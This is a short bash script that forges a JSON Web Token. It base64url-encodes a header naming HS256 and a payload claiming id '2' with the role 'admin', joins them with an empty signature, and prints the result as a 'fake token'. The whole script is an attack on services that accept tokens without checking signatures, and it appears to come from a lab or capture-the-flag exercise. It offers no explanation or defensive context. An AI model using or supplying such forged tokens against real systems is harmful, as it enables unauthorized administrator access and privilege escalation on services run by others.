#!/bin/bash


fake_header='{"alg":"HS256","typ":"JWT"}'

fake_payload='{"id":"2","role":"admin"}'



header_b64=$(echo -n "$fake_header" | base64 | tr -d '=' | tr '/+' '_-')

payload_b64=$(echo -n "$fake_payload" | base64 | tr -d '=' | tr '/+' '_-')




maketoken="${header_b64}.${payload_b64}."


echo "final fake token :: $maketoken"
